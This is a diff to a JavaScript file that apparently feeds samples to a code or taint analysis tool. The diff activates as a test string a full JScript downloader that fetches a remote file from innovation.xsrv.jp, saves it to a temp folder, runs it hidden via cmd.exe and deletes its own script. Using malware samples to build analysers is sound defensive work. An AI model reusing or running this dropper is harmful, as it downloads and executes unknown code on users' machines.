@@ -23,132 +23,132 @@
 // // this example shows K is tainted in the if branch so then unless there is a solid assignment it will not be evaluated as 
 // `
 
-const initCode = `
-const jEJ = ActiveXObject;
-const w = new ActiveXObject("Scripting.Dictionary");
-w.Add("a", "b");
-const GJ = 4;
-
-if (true && w.Exists("a")) {
-    const K = 24;
-    
-    var K = oL.GetSpecialFolder(2) + "\\\\" + oL.GetTempName();
-    
-    var K = "deleteF";
-    var lyB = true;
-    GJ = 3;
-}
-
-GJ > 0;
-`
-
 // const initCode = `
-// function q(fVy) {
-//     const jEJ = ActiveXObject;
-//     const w = new ActiveXObject("Scripting.Dictionary");
-//     w.Add("a", "b");
-//     const GJ = 4;
+// const jEJ = ActiveXObject;
+// const w = new ActiveXObject("Scripting.Dictionary");
+// w.Add("a", "b");
+// const GJ = 4;
 
-//     if (fVy > 5 && w.Exists("a")) {
-//         const K = 24;
-//         const hL = [];
-//         hL[0] = "c.";
-//         hL[1] = "no";
-//         hL[2] = "/";
-//         hL[3] = "n";
-//         hL[4] = "j";
-//         hL[5] = "p";
-//         hL[6] = ":/";
-//         hL[7] = "i";
-//         hL[8] = "on";
-//         hL[9] = "v";
-//         hL[10] = ".x";
-//         hL[11] = "g";
-//         hL[12] = ".j";
-//         hL[13] = "/i";
-//         hL[14] = "tp";
-//         hL[15] = "ht";
-//         hL[16] = "t";
-//         hL[17] = "va";
-//         hL[18] = "p";
-//         hL[19] = "1";
-//         hL[20] = "sr";
-//         const a = "http://innovation.xsrv.jp/1c.jpg";
-//         K = "http://innovation.xsrv.jp/1c.jpg";
-//         var eDT;
-//         var iSj;
-//         const mj = ActiveXObject;
-//         const zs = new ActiveXObject("MSXML2.XMLHTTP");
-//         const U = 0;
-//         zs.open("GET", "http://innovation.xsrv.jp/1c.jpg", 0);
-
-//         try {
-//             zs.send();
-//         } catch (tLk) {
-//             return false;
-//         }
-
-//         if (zs.Status != 200)
-//             return false;
-
-//         var oL = new ActiveXObject("Scripting.FileSystemObject");
-//         var W = new ActiveXObject("ADODB.Stream");
-//         const AgR = "GetSpecialFolder";
-//         const bb = "GetTempName";
-//         const DK = "\\";
-//         const rPj = oL.GetSpecialFolder(2) + "\\" + oL.GetTempName();
-//         var K = oL.GetSpecialFolder(2) + "\\" + oL.GetTempName();
-//         W.Open();
-//         W.Type = 1;
-//         W.Write(zs.ResponseBody);
-//         const r = 36123;
-//         const X = 72128;
-//         const g = 392;
-//         const Ji = 0;
-//         W.Position = 0;
-//         var PD = W.Read();
-//         const uk = "ADODB.Recordse";
-//         const NU = new ActiveXObject("ADODB.Recordset");
-//         const jzg = W.Size;
-//         const DC = 201;
-//         NU.fields.append("bin", 201, W.Size);
-//         const MhN = "ope";
-//         NU.open();
-//         NU.addNew();
-//         const G = "bin";
-//         const ARD = "appendChunk";
-//         NU("bin").appendChunk(W.Read());
-//         const nI = "updat";
-//         NU.update();
-//         PD = NU("bin").value;
-
-//         if (NU("bin").value.length < 10)
-//             return false;
-
-//         W.SaveToFile(oL.GetSpecialFolder(2) + "\\" + oL.GetTempName());
-//         W.Close();
-//         var uM = ActiveXObject;
-//         var Jy = "Wscript.Shell";
-//         var xV = "c";
-//         var z = "cm";
-//         var H = "cmd";
-//         var Wch = "cmd.";
-//         var rdR = "cmd.e";
-//         var pW = "cmd.ex";
-//         var iSj = "cmd.ex";
-//         var eDT = new ActiveXObject("Wscript.Shell");
-//         var x = "run";
-//         eDT.run("cmd.exe /c " + (oL.GetSpecialFolder(2) + "\\" + oL.GetTempName()), 0);
-//         var K = "deleteF";
-//         const ffv = WScript;
-//         oL.deleteFile(WScript.ScriptFullName);
-//         var lyB = true;
-//         GJ = 3;
-//     }
-
-//     return GJ;
+// if (true && w.Exists("a")) {
+//     const K = 24;
+    
+//     var K = oL.GetSpecialFolder(2) + "\\\\" + oL.GetTempName();
+    
+//     var K = "deleteF";
+//     var lyB = true;
+//     GJ = 3;
 // }
+
+// GJ > 0;
 // `
+
+const initCode = `
+function q(fVy) {
+    const jEJ = ActiveXObject;
+    const w = new ActiveXObject("Scripting.Dictionary");
+    w.Add("a", "b");
+    const GJ = 4;
+
+    if (fVy > 5 && w.Exists("a")) {
+        const K = 24;
+        const hL = [];
+        hL[0] = "c.";
+        hL[1] = "no";
+        hL[2] = "/";
+        hL[3] = "n";
+        hL[4] = "j";
+        hL[5] = "p";
+        hL[6] = ":/";
+        hL[7] = "i";
+        hL[8] = "on";
+        hL[9] = "v";
+        hL[10] = ".x";
+        hL[11] = "g";
+        hL[12] = ".j";
+        hL[13] = "/i";
+        hL[14] = "tp";
+        hL[15] = "ht";
+        hL[16] = "t";
+        hL[17] = "va";
+        hL[18] = "p";
+        hL[19] = "1";
+        hL[20] = "sr";
+        const a = "http://innovation.xsrv.jp/1c.jpg";
+        K = "http://innovation.xsrv.jp/1c.jpg";
+        var eDT;
+        var iSj;
+        const mj = ActiveXObject;
+        const zs = new ActiveXObject("MSXML2.XMLHTTP");
+        const U = 0;
+        zs.open("GET", "http://innovation.xsrv.jp/1c.jpg", 0);
+
+        try {
+            zs.send();
+        } catch (tLk) {
+            return false;
+        }
+
+        if (zs.Status != 200)
+            return false;
+
+        var oL = new ActiveXObject("Scripting.FileSystemObject");
+        var W = new ActiveXObject("ADODB.Stream");
+        const AgR = "GetSpecialFolder";
+        const bb = "GetTempName";
+        const DK = "\\";
+        const rPj = oL.GetSpecialFolder(2) + "\\" + oL.GetTempName();
+        var K = oL.GetSpecialFolder(2) + "\\" + oL.GetTempName();
+        W.Open();
+        W.Type = 1;
+        W.Write(zs.ResponseBody);
+        const r = 36123;
+        const X = 72128;
+        const g = 392;
+        const Ji = 0;
+        W.Position = 0;
+        var PD = W.Read();
+        const uk = "ADODB.Recordse";
+        const NU = new ActiveXObject("ADODB.Recordset");
+        const jzg = W.Size;
+        const DC = 201;
+        NU.fields.append("bin", 201, W.Size);
+        const MhN = "ope";
+        NU.open();
+        NU.addNew();
+        const G = "bin";
+        const ARD = "appendChunk";
+        NU("bin").appendChunk(W.Read());
+        const nI = "updat";
+        NU.update();
+        PD = NU("bin").value;
+
+        if (NU("bin").value.length < 10)
+            return false;
+
+        W.SaveToFile(oL.GetSpecialFolder(2) + "\\" + oL.GetTempName());
+        W.Close();
+        var uM = ActiveXObject;
+        var Jy = "Wscript.Shell";
+        var xV = "c";
+        var z = "cm";
+        var H = "cmd";
+        var Wch = "cmd.";
+        var rdR = "cmd.e";
+        var pW = "cmd.ex";
+        var iSj = "cmd.ex";
+        var eDT = new ActiveXObject("Wscript.Shell");
+        var x = "run";
+        eDT.run("cmd.exe /c " + (oL.GetSpecialFolder(2) + "\\" + oL.GetTempName()), 0);
+        var K = "deleteF";
+        const ffv = WScript;
+        oL.deleteFile(WScript.ScriptFullName);
+        var lyB = true;
+        GJ = 3;
+    }
+
+    return GJ;
+}
+`
 
 // const initCode = `
 // function R(K) {
